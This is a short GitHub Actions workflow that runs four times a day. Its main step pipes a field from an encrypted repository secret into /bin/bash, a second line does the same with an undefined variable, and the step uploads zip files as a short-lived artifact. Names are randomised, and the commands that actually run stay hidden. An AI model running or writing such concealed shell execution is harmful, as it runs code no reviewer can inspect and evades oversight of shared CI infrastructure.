name: zhengsonglianghe
on:
  workflow_dispatch:

  schedule:
    - cron: '48 3,9,15,21 * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: zhengsonglianghe
        env:
          jo67423: ${{ secrets.jo67423 }}
        run: |
          printf '%s' "$jo67423" | jq -r .ktqyu06 | /bin/bash
          echo $agh1 | jq -r .mzwsl6 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: Tj3XgCUQ
          path: "*.zip"
          retention-days: 1
